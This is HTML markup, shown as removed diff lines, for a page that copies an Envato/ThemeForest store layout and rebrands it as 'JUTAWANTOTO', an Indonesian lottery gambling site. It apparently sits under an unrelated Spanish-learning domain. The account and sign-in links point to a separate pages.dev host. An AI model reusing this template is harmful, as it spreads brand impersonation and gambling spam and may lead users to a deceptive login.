-                        <a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-shopify" href="https://spanishlearningprogram.com/cultural/">
-                            Shopify
-                        </a>
-                        <ul class="is-hidden" id="off-canvas-shopify">
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Show all
-                                    Shopify</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Popular Items</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Fashion</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Shopping</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Health &amp; Beauty</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Technology</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Entertainment</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Miscellaneous</a>
-                            </li>
-                        </ul>
-
-                    </li>
-                    <li>
-
-                        <a class="off-canvas-category-link--empty" href="https://spanishlearningprogram.com/cultural/">
-                            Jamstack
-                        </a>
-                    </li>
-                    <li>
-                        <a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-marketing" href="https://spanishlearningprogram.com/cultural/">
-                            Marketing
-                        </a>
-                        <ul class="is-hidden" id="off-canvas-marketing">
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Show all
-                                    Marketing</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Popular Items</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Email Templates</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Landing Pages</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Unbounce Landing Pages</a>
-                            </li>
-                        </ul>
-
-                    </li>
-                    <li>
-                        <a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-cms" href="https://spanishlearningprogram.com/cultural/">
-                            CMS
-                        </a>
-                        <ul class="is-hidden" id="off-canvas-cms">
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Show all CMS</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Popular Items</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Concrete5</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Drupal</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">HubSpot CMS Hub</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Joomla</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">MODX
-                                    Themes</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Moodle</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Webflow</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Weebly</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Miscellaneous</a>
-                            </li>
-                        </ul>
-
-                    </li>
-                    <li>
-                        <a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-ecommerce" href="https://spanishlearningprogram.com/cultural/">
-                            eCommerce
-                        </a>
-                        <ul class="is-hidden" id="off-canvas-ecommerce">
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Show all
-                                    eCommerce</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Popular Items</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">WooCommerce</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">BigCommerce</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Drupal Commerce</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Easy Digital Downloads</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Ecwid</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Magento</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">OpenCart</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">PrestaShop</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Shopify</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Ubercart</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">VirtueMart</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Zen
-                                    Cart</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Miscellaneous</a>
-                            </li>
-                        </ul>
-
-                    </li>
-                    <li>
-                        <a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-ui-templates" href="https://spanishlearningprogram.com/cultural/">
-                            UI Templates
-                        </a>
-                        <ul class="is-hidden" id="off-canvas-ui-templates">
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Popular Items</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Figma</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Adobe
-                                    XD</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Photoshop</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Sketch</a>
-                            </li>
-                        </ul>
-
-                    </li>
-                    <li>
-
-                        <a class="off-canvas-category-link--empty" href="https://spanishlearningprogram.com/cultural/">
-                            Plugins
-                        </a>
-                    </li>
-                    <li>
-                        <a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-more" href="https://spanishlearningprogram.com/cultural/">
-                            More
-                        </a>
-                        <ul class="is-hidden" id="off-canvas-more">
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Blogging</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Courses</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Facebook Templates</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Free Elementor Templates</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Free
-                                    WordPress Themes</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Forums</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Ghost
-                                    Themes</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub" href="https://spanishlearningprogram.com/cultural/">Tumblr</a>
-                            </li>
-                            <li>
-                                <a class="off-canvas-category-link--sub external-link elements-nav__category-link" target="_blank" data-analytics-view-payload="{&quot;eventName&quot;:&quot;view_promotion&quot;,&quot;contextDetail&quot;:&quot;sub nav&quot;,&quot;ecommerce&quot;:{&quot;promotionId&quot;:&quot;Unlimited Creative Assets&quot;,&quot;promotionName&quot;:&quot;Unlimited Creative Assets&quot;,&quot;promotionType&quot;:&quot;elements referral&quot;}}" data-analytics-click-payload="{&quot;eventName&quot;:&quot;select_promotion&quot;,&quot;contextDetail&quot;:&quot;sub nav&quot;,&quot;ecommerce&quot;:{&quot;promotionId&quot;:&quot;Unlimited Creative Assets&quot;,&quot;promotionName&quot;:&quot;Unlimited Creative Assets&quot;,&quot;promotionType&quot;:&quot;elements referral&quot;}}" href="https://spanishlearningprogram.com/cultural/">Unlimited
-                                    Creative Assets</a>
-                            </li>
-                        </ul>
-
-                    </li>
-
-                    <li>
-                        <a class="elements-nav__category-link external-link" target="_blank" data-analytics-view-payload="{&quot;eventName&quot;:&quot;view_promotion&quot;,&quot;contextDetail&quot;:&quot;site switcher&quot;,&quot;ecommerce&quot;:{&quot;promotionId&quot;:&quot;switcher_mobile_31JUL2024&quot;,&quot;promotionName&quot;:&quot;switcher_mobile_31JUL2024&quot;,&quot;promotionType&quot;:&quot;elements referral&quot;}}" data-analytics-click-payload="{&quot;eventName&quot;:&quot;select_promotion&quot;,&quot;contextDetail&quot;:&quot;site switcher&quot;,&quot;ecommerce&quot;:{&quot;promotionId&quot;:&quot;switcher_mobile_31JUL2024&quot;,&quot;promotionName&quot;:&quot;switcher_mobile_31JUL2024&quot;,&quot;promotionType&quot;:&quot;elements referral&quot;}}" href="https://spanishlearningprogram.com/cultural/">Unlimited
-                            Downloads</a>
-                    </li>
-
-                </ul>
-
-            </div>
-
-        </div>
-
-        <div class="page__off-canvas--right overflow" bis_skin_checked="1">
-            <div class="off-canvas-right" bis_skin_checked="1">
-                <a class="off-canvas-right__link--cart" href="https://spanishlearningprogram.com/cultural/">
-                    Guest Cart
-                    <div class="shopping-cart-summary is-empty" data-view="cartCount" bis_skin_checked="1">
-                        <span class="js-cart-summary-count shopping-cart-summary__count">0</span>
-                        <i class="e-icon -icon-cart"></i>
-                    </div>
-                </a>
-                <a class="off-canvas-right__link" href="https://bingung-yakk.pages.dev/">
-                    Create an Envato Account
-                    <i class="e-icon -icon-envato"></i>
-                </a>
-                <a class="off-canvas-right__link" href="https://bingung-yakk.pages.dev/">
-                    Sign In
-                    <i class="e-icon -icon-login"></i>
-                </a>
-            </div>
-
-        </div>
-
-        <div class="page__canvas" bis_skin_checked="1">
-            <div class="canvas" bis_skin_checked="1">
-                <div class="canvas__header" bis_skin_checked="1">
-
-                    <header class="site-header">
-                        <div class="site-header__mini is-hidden-desktop" bis_skin_checked="1">
-                            <div class="header-mini" bis_skin_checked="1">
-                                <div class="header-mini__button--cart" bis_skin_checked="1">
-                                    <a class="btn btn--square" href="https://spanishlearningprogram.com/cultural/">
-                                        <svg width="14px" height="14px" viewBox="0 0 14 14" class="header-mini__button-cart-icon" xmlns="http://www.w3.org/2000/svg" aria-labelledby="title" role="img">
-                                            <title>Cart</title>
-                                            <path d="M 0.009 1.349 C 0.009 1.753 0.347 2.086 0.765 2.086 C 0.765 2.086 0.766 2.086 0.767 2.086 L 0.767 2.09 L 2.289 2.09 L 5.029 7.698 L 4.001 9.507 C 3.88 9.714 3.812 9.958 3.812 10.217 C 3.812 11.028 4.496 11.694 5.335 11.694 L 14.469 11.694 L 14.469 11.694 C 14.886 11.693 15.227 11.36 15.227 10.957 C 15.227 10.552 14.886 10.221 14.469 10.219 L 14.469 10.217 L 5.653 10.217 C 5.547 10.217 5.463 10.135 5.463 10.031 L 5.487 9.943 L 6.171 8.738 L 11.842 8.738 C 12.415 8.738 12.917 8.436 13.175 7.978 L 15.901 3.183 C 15.96 3.08 15.991 2.954 15.991 2.828 C 15.991 2.422 15.65 2.09 15.23 2.09 L 3.972 2.09 L 3.481 1.077 L 3.466 1.043 C 3.343 0.79 3.084 0.612 2.778 0.612 C 2.777 0.612 0.765 0.612 0.765 0.612 C 0.347 0.612 0.009 0.943 0.009 1.349 Z M 3.819 13.911 C 3.819 14.724 4.496 15.389 5.335 15.389 C 6.171 15.389 6.857 14.724 6.857 13.911 C 6.857 13.097 6.171 12.434 5.335 12.434 C 4.496 12.434 3.819 13.097 3.819 13.911 Z M 11.431 13.911 C 11.431 14.724 12.11 15.389 12.946 15.389 C 13.784 15.389 14.469 14.724 14.469 13.911 C 14.469 13.097 13.784 12.434 12.946 12.434 C 12.11 12.434 11.431 13.097 11.431 13.911 Z">
-                                            </path>
-
-                                        </svg>
-
-
-                                        <span class="is-hidden">Cart</span>
-                                        <span class="header-mini__button-cart-cart-amount is-hidden">
-                                            0
-                                        </span>
-                                    </a>
-                                </div>
-                                <div class="header-mini__button--account" bis_skin_checked="1">
-                                    <a class="btn btn--square" data-view="offCanvasNavToggle" data-off-canvas="right" href="https://spanishlearningprogram.com/cultural/">
-                                        <i class="e-icon -icon-person"></i>
-                                        <span class="is-hidden">Account</span>
-                                    </a>
-                                </div>
-
-                                <div class="header-mini__button--categories" bis_skin_checked="1">
-                                    <a class="btn btn--square" data-view="offCanvasNavToggle" data-off-canvas="left" href="https://spanishlearningprogram.com/cultural/">
-                                        <i class="e-icon -icon-hamburger"></i>
-                                        <span class="is-hidden">Sites, Search &amp; Categories</span>
-                                    </a>
-                                </div>
-
-                                <div class="header-mini__logo" bis_skin_checked="1">
-                                    <a href="https://spanishlearningprogram.com/cultural/">
-                                        <img alt="JUTAWANTOTO" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgTdt3lExppcdqwfkj9jese5QLkAim4R4UaBYC1W0EYO4t1fzIu2SXMRpboOvzCCA9oCBXuK0x3laUzvtsBr9WpohdUG-5ivBshkmx3MxhZhrm3JF9o1hoZthRviMoOE3-PqQg0jpYPp6UdpNVFElKg-HZkOOS_BmzXg1xiRzlDAlB2RnKfxCqw7gJiUbc/s400/logojutawan.webp" style="height:40px; width:auto; display:inline-block;">
-                                    </a>
-                                </div>
-
-
-
-                            </div>
-
-                        </div>
-
-                        <div class="global-header is-hidden-tablet-and-below" bis_skin_checked="1">
-
-                            <div class="grid-container -layout-wide" bis_skin_checked="1">
-                                <div class="global-header__wrapper" bis_skin_checked="1">
-                                    <a href="https://spanishlearningprogram.com/cultural/">
-                                        <img height="50" alt="JUTAWANTOTO" class="global-header__logo" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgTdt3lExppcdqwfkj9jese5QLkAim4R4UaBYC1W0EYO4t1fzIu2SXMRpboOvzCCA9oCBXuK0x3laUzvtsBr9WpohdUG-5ivBshkmx3MxhZhrm3JF9o1hoZthRviMoOE3-PqQg0jpYPp6UdpNVFElKg-HZkOOS_BmzXg1xiRzlDAlB2RnKfxCqw7gJiUbc/s400/logojutawan.webp">
-                                    </a>
-                                    <nav class="global-header-menu" role="navigation">
-                                        <ul class="global-header-menu__list">
-                                            <li class="global-header-menu__list-item">
-                                                <a class="global-header-menu__link" href="https://spanishlearningprogram.com/cultural/">
-                                                    <span class="global-header-menu__link-text">
-                                                        TOGEL
-                                                    </span>
-                                                </a>
-                                            </li>
-                                            <li class="global-header-menu__list-item">
-                                                <a class="global-header-menu__link" href="https://spanishlearningprogram.com/cultural/">
-                                                    <span class="global-header-menu__link-text">
-                                                        SITUS TOGEL
-                                                    </span>
-                                                </a>
-                                            </li>
-
-
-                                            <li data-view="globalHeaderMenuDropdownHandler" class="global-header-menu__list-item--with-dropdown">
-                                                <a data-lazy-load-trigger="mouseover" class="global-header-menu__link" href="https://spanishlearningprogram.com/cultural/">
-                                                    <svg width="16px" height="16px" viewBox="0 0 16 16" class="global-header-menu__icon" xmlns="http://www.w3.org/2000/svg" aria-labelledby="title" role="img">
-                                                        <title>Menu</title>
-                                                        <path d="M3.5 2A1.5 1.5 0 0 1 5 3.5 1.5 1.5 0 0 1 3.5 5 1.5 1.5 0 0 1 2 3.5 1.5 1.5 0 0 1 3.5 2zM8 2a1.5 1.5 0 0 1 1.5 1.5A1.5 1.5 0 0 1 8 5a1.5 1.5 0 0 1-1.5-1.5A1.5 1.5 0 0 1 8 2zM12.5 2A1.5 1.5 0 0 1 14 3.5 1.5 1.5 0 0 1 12.5 5 1.5 1.5 0 0 1 11 3.5 1.5 1.5 0 0 1 12.5 2zM3.5 6.5A1.5 1.5 0 0 1 5 8a1.5 1.5 0 0 1-1.5 1.5A1.5 1.5 0 0 1 2 8a1.5 1.5 0 0 1 1.5-1.5zM8 6.5A1.5 1.5 0 0 1 9.5 8 1.5 1.5 0 0 1 8 9.5 1.5 1.5 0 0 1 6.5 8 1.5 1.5 0 0 1 8 6.5zM12.5 6.5A1.5 1.5 0 0 1 14 8a1.5 1.5 0 0 1-1.5 1.5A1.5 1.5 0 0 1 11 8a1.5 1.5 0 0 1 1.5-1.5zM3.5 11A1.5 1.5 0 0 1 5 12.5 1.5 1.5 0 0 1 3.5 14 1.5 1.5 0 0 1 2 12.5 1.5 1.5 0 0 1 3.5 11zM8 11a1.5 1.5 0 0 1 1.5 1.5A1.5 1.5 0 0 1 8 14a1.5 1.5 0 0 1-1.5-1.5A1.5 1.5 0 0 1 8 11zM12.5 11a1.5 1.5 0 0 1 1.5 1.5 1.5 1.5 0 0 1-1.5 1.5 1.5 1.5 0 0 1-1.5-1.5 1.5 1.5 0 0 1 1.5-1.5z">
-                                                        </path>
-
-                                                    </svg>
-
-                                                    <span class="global-header-menu__link-text">
-                                                        Our Products
-                                                    </span>
-                                                </a>
-                                            <li class="global-header-menu__list-item -background-light -border-radius">
-                                                <a id="spec-link-cart" class="global-header-menu__link h-pr1" href="https://spanishlearningprogram.com/cultural/">
-
-                                                    <svg width="16px" height="16px" viewBox="0 0 16 16" class="global-header-menu__icon global-header-menu__icon-cart" xmlns="http://www.w3.org/2000/svg" aria-labelledby="title" role="img">
-                                                        <title>Cart</title>
-                                                        <path d="M 0.009 1.349 C 0.009 1.753 0.347 2.086 0.765 2.086 C 0.765 2.086 0.766 2.086 0.767 2.086 L 0.767 2.09 L 2.289 2.09 L 5.029 7.698 L 4.001 9.507 C 3.88 9.714 3.812 9.958 3.812 10.217 C 3.812 11.028 4.496 11.694 5.335 11.694 L 14.469 11.694 L 14.469 11.694 C 14.886 11.693 15.227 11.36 15.227 10.957 C 15.227 10.552 14.886 10.221 14.469 10.219 L 14.469 10.217 L 5.653 10.217 C 5.547 10.217 5.463 10.135 5.463 10.031 L 5.487 9.943 L 6.171 8.738 L 11.842 8.738 C 12.415 8.738 12.917 8.436 13.175 7.978 L 15.901 3.183 C 15.96 3.08 15.991 2.954 15.991 2.828 C 15.991 2.422 15.65 2.09 15.23 2.09 L 3.972 2.09 L 3.481 1.077 L 3.466 1.043 C 3.343 0.79 3.084 0.612 2.778 0.612 C 2.777 0.612 0.765 0.612 0.765 0.612 C 0.347 0.612 0.009 0.943 0.009 1.349 Z M 3.819 13.911 C 3.819 14.724 4.496 15.389 5.335 15.389 C 6.171 15.389 6.857 14.724 6.857 13.911 C 6.857 13.097 6.171 12.434 5.335 12.434 C 4.496 12.434 3.819 13.097 3.819 13.911 Z M 11.431 13.911 C 11.431 14.724 12.11 15.389 12.946 15.389 C 13.784 15.389 14.469 14.724 14.469 13.911 C 14.469 13.097 13.784 12.434 12.946 12.434 C 12.11 12.434 11.431 13.097 11.431 13.911 Z">
-                                                        </path>
-
-                                                    </svg>
-
-
-                                                    <span class="global-header-menu__link-cart-amount is-hidden" data-view="headerCartCount" data-test-id="header_cart_count">0</span>
-                                                </a>
-                                            </li>
-
-                                            <li class="global-header-menu__list-item -background-light -border-radius">
-                                                <a class="global-header-menu__link h-pl1" data-view="modalAjax" href="https://spanishlearningprogram.com/cultural/">
-                                                    <span id="spec-user-username" class="global-header-menu__link-text">
-                                                        Sign In
-                                                    </span>
-                                                </a>
-                                            </li>
-
-                                        </ul>
-                                    </nav>
-                                </div>
-                            </div>
-                        </div>
-
-
-                        <div class="site-header__sites is-hidden-tablet-and-below" bis_skin_checked="1">
-                            <div class="header-sites header-site-titles" bis_skin_checked="1">
-                                <div class="grid-container -layout-wide" bis_skin_checked="1">
-                                    <nav class="header-site-titles__container">
-                                        <div class="header-site-titles__site" bis_skin_checked="1">
-                                            <a class="header-site-titles__link t-link is-active" alt="Web Templates" href="https://spanishlearningprogram.com/cultural/">JUTAWANTOTO</a>
-                                        </div>
-                                        <div class="header-site-titles__site" bis_skin_checked="1">
-                                            <a class="header-site-titles__link t-link" alt="Code" href="https://spanishlearningprogram.com/cultural/">JUTAWAN TOTO</a>
-                                        </div>
-                                        <div class="header-site-titles__site" bis_skin_checked="1">
-                                            <a class="header-site-titles__link t-link" alt="Video" href="https://spanishlearningprogram.com/cultural/">TOGEL ONLINE</a>
-                                        </div>
-                                        <div class="header-site-titles__site" bis_skin_checked="1">
-                                            <a class="header-site-titles__link t-link" alt="Music" href="https://spanishlearningprogram.com/cultural/">LINK TOGEL</a>
-                                        </div>
-                                        <div class="header-site-titles__site" bis_skin_checked="1">
-                                            <a class="header-site-titles__link t-link" alt="Graphics" href="https://spanishlearningprogram.com/cultural/">BANDAR TOTO</a>
-                                        </div>
-                                        <div class="header-site-titles__site" bis_skin_checked="1">
-                                            <a class="header-site-titles__link t-link" alt="Photos" href="https://spanishlearningprogram.com/cultural/">SITUS TOTO</a>
-                                        </div>
-                                        <div class="header-site-titles__site" bis_skin_checked="1">
-                                            <a class="header-site-titles__link t-link" alt="3D Files" href="https://spanishlearningprogram.com/cultural/">BO TOGEL TERPERCAYA</a>
-                                        </div>
-
-                                        <div class="header-site-titles__site elements-nav__container" bis_skin_checked="1">
-                                            <a class="header-site-titles__link t-link elements-nav__main-link" href="https://elements.envato.com/?utm_campaign=elements_mkt-switcher_31JUL2024&amp;utm_content=tf_item_8988002&amp;utm_medium=referral&amp;utm_source=themeforest.net" target="_blank">
-                                                <span>
-                                                    Unlimited Downloads
-                                                </span>
-                                            </a>
-
-                                            <a target="_blank" class="elements-nav__dropdown-container unique-selling-points__variant" data-analytics-view-payload="{&quot;eventName&quot;:&quot;view_promotion&quot;,&quot;contextDetail&quot;:&quot;site switcher&quot;,&quot;ecommerce&quot;:{&quot;promotionId&quot;:&quot;elements_mkt-switcher_31JUL2024&quot;,&quot;promotionName&quot;:&quot;elements_mkt-switcher_31JUL2024&quot;,&quot;promotionType&quot;:&quot;elements referral&quot;}}" data-analytics-click-payload="{&quot;eventName&quot;:&quot;select_promotion&quot;,&quot;contextDetail&quot;:&quot;site switcher&quot;,&quot;ecommerce&quot;:{&quot;promotionId&quot;:&quot;elements_mkt-switcher_31JUL2024&quot;,&quot;promotionName&quot;:&quot;elements_mkt-switcher_31JUL2024&quot;,&quot;promotionType&quot;:&quot;elements referral&quot;}}" href="https://elements.envato.com/?utm_campaign=elements_mkt-switcher_31JUL2024&amp;utm_content=tf_item_8988002&amp;utm_medium=referral&amp;utm_source=themeforest.net">
-                                                <div class="elements-nav__main-panel" bis_skin_checked="1">
-                                                    <img class="elements-nav__logo-container" loading="lazy" src="https://public-assets.envato-static.com/assets/header/EnvatoElements-logo-4f70ffb865370a5fb978e9a1fc5bbedeeecdfceb8d0ebec2186aef4bee5db79d.svg" alt="Elements logo" height="23" width="101">
-
-                                                    <div class="elements-nav__punch-line" bis_skin_checked="1">
-                                                        <h2>
-                                                            Looking for unlimited downloads?
-                                                        </h2>
-                                                        <p>
-                                                            Subscribe to Envato Elements.
-                                                        </p>
-                                                        <ul>
-                                                            <li>
-                                                                <img src="https://public-assets.envato-static.com/assets/header/badge-a65149663b95bcee411e80ccf4da9788f174155587980d8f1d9c44fd8b59edd8.svg" alt="badge" width="20" height="20">
-                                                                Millions of premium assets
-                                                            </li>
-                                                            <li>
-                                                                <img src="https://public-assets.envato-static.com/assets/header/thumbs_up-e5ce4c821cfd6a6aeba61127a8e8c4d2d7c566e654f588a22708c64d66680869.svg" alt="thumbs up" width="20" height="20">
-                                                                Great value subscription
-                                                            </li>
-                                                        </ul>
-                                                        <button class="brand-neue-button brand-neue-button__open-in-new elements-nav__cta">Let's
-                                                            create</button>
-                                                        <p></p>
-                                                    </div>
-                                                </div>
-                                                <div class="elements-nav__secondary-panel" bis_skin_checked="1">
-                                                    <img class="elements-nav__secondary-panel__collage" loading="lazy" src="https://public-assets.envato-static.com/assets/header/items-collage-1x-a39e4a5834e75c32a634cc7311720baa491687b1aaa4b709ebd1acf0f8427b53.png" srcset="https://public-assets.envato-static.com/assets/header/items-collage-2x-75e1ad16a46b9788861780a57feeb5fd1ad1026ecce9330302f0ef8f6f542697.png 2x" alt="Collage of Elements items" width="267" height="233">
-                                                </div>
-                                            </a>
-                                        </div>
-
-                                        <div class="header-site-floating-logo__container" bis_skin_checked="1">
-                                            <div class="" bis_skin_checked="1">
-                                                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEifvSRdmzWUfSdlWD-eeRRQ8A998oOxzvX9Ni1aH8if00WMRghephi3-JO3x-Ppg9AaTPd_XJfiM0gkBy8aeAUcR9zrw3H2RawrT_2JAsBkI0qU7cOKbaOwzflXXoOBIuuZRdBvwAO1p5uiwIzaCZTkDibBBWvY-XATj8HoidimKPjmfPU2QLgxpKMwT5Q/s300/logo-jtwn.jpg" alt="bandar togel" style="max-width: 50px; height: auto; object-fit: contain;" data-spm-anchor-id="0.0.header.i0.27e27142EyRkBl">
-                                            </div>
-                                        </div>
-                                    </nav>
-                                </div>
-                            </div>
-
-                        </div>
-
-                        <div class="site-header__categories is-hidden-tablet-and-below" bis_skin_checked="1">
-                            <div class="header-categories" bis_skin_checked="1">
-                                <div class="grid-container -layout-wide" bis_skin_checked="1">
-                                    <ul class="header-categories__links">
-                                        <li class="header-categories__links-item">
-                                            <a class="header-categories__main-link" data-view="touchOnlyDropdown" data-dropdown-target=".js-categories-0-dropdown" href="https://spanishlearningprogram.com/cultural/">JUTAWANTOTO</a>
-                                        </li>
-                                        <li class="header-categories__links-item">
-                                            <a class="header-categories__main-link" data-view="touchOnlyDropdown" data-dropdown-target=".js-categories-1-dropdown" href="https://spanishlearningprogram.com/cultural/">TOTO TOGEL</a>
-                                        </li>
-                                        <li class="header-categories__links-item">
-                                            <a class="header-categories__main-link" data-view="touchOnlyDropdown" data-dropdown-target=".js-categories-2-dropdown" href="https://spanishlearningprogram.com/cultural/">SITUS TOGEL</a>
-                                        </li>
-                                        <li class="header-categories__links-item">
-                                            <a class="header-categories__main-link header-categories__main-link--empty" href="https://spanishlearningprogram.com/cultural/">TOGEL RESMI</a>
-                                        </li>
-                                        <li class="header-categories__links-item">
-                                            <a class="header-categories__main-link" data-view="touchOnlyDropdown" data-dropdown-target=".js-categories-4-dropdown" href="https://spanishlearningprogram.com/cultural/">BO TOGEL</a>
-                                            </a>
-                                        </li>
-                                        <li class="header-categories__links-item">
-                                            <a class="header-categories__main-link" data-view="touchOnlyDropdown" data-dropdown-target=".js-categories-5-dropdown" href="https://spanishlearningprogram.com/cultural/">SITUS TOGEL TERPERCAYA</a>
-                                        </li>
-                                        <li class="header-categories__links-item">
-                                            <a class="header-categories__main-link header-categories__main-link--empty" href="https://spanishlearningprogram.com/cultural/">SITUS TOTO MACAU</a>
-                                        </li>
-                                    </ul>
-                                        <div class="header-categories__search" bis_skin_checked="1">
-                                            <form id="search" data-view="searchField" action="https://spanishlearningprogram.com/cultural/" accept-charset="UTF-8" method="get">
-                                                <div class="search-field -border-light h-ml2" bis_skin_checked="1">
-                                                    <div class="search-field__input" bis_skin_checked="1">
-                                                        <input id="term" name="term" class="js-term search-field__input-field" type="search" placeholder="GACOR">
-                                                    </div>
-                                                    <button class="search-field__button" type="submit">
-                                                        <i class="e-icon -icon-search"><span class="e-icon__alt">GACOR</span></i>
-                                                    </button>
-                                                </div>
-                                            </form>
-                                        </div>
-                                    
-                                </div>
-                            </div>
-
-                        </div>
-                        
-                    </header>
-                </div>
-
-                <div class="js-canvas__body canvas__body" bis_skin_checked="1">
-                    <div class="grid-container" bis_skin_checked="1">
-                    </div>
-
-
-
-                    <div class="context-header " bis_skin_checked="1">
-                        <div class="grid-container " bis_skin_checked="1">
-                            <nav class="breadcrumbs h-text-truncate  ">
-                            </nav>
-
-                            <div class="item-header" data-view="itemHeader" bis_skin_checked="1">
-                                <div class="item-header__top" bis_skin_checked="1">
-                                    <div class="item-header__title" bis_skin_checked="1">
-                                        <h1 class="t-heading -color-inherit -size-l h-m0 is-hidden-phone">Cultural ✈️ JUTAWANTOTO Link Bandar Bo Togel Situs Toto Platform Resmi Terpercaya #1</h1>
-
-                                        <h1 class="t-heading -color-inherit -size-xs h-m0 is-hidden-tablet-and-above">
-                                            Cultural ✈️ JUTAWANTOTO Link Bandar Bo Togel Situs Toto Platform Resmi Terpercaya #1
-                                        </h1>
-                                    </div>
-
-                                    <div class="item-header__price is-hidden-desktop" bis_skin_checked="1">
